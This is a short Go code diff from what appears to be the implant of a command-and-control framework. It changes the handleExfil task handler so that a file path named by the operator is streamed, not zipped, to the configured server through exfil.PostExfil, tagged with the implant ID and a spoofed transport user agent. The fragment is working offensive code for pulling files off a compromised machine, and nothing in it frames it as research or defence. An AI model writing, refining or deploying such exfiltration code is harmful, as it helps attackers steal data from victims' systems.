@@ -691,14 +691,11 @@ func handleExfil(task *proto.Task) *proto.TaskResult {
 		return fail(task, "no path specified")
 	}
 	path := task.Args[0]
-	zipData, err := exfil.ZipPath(path)
-	if err != nil {
-		return fail(task, "zip failed: "+err.Error())
-	}
+
 	filename := fmt.Sprintf("exfil_%s.zip", task.ID[:8])
-	if err := exfil.PostExfil(Config.ServerURL, zipData, filename, transport.UserAgent, task.ImplantID); err != nil {
+	if err := exfil.PostExfil(Config.ServerURL, path, filename, transport.UserAgent, task.ImplantID); err != nil {
 		return fail(task, "upload failed: "+err.Error())
 	}
 
-	return success(task, []byte(fmt.Sprintf("exfiltrated %s (%d bytes zipped)", path, len(zipData))))
+	return success(task, []byte(fmt.Sprintf("exfiltrated %s (streaming)", path)))
 }
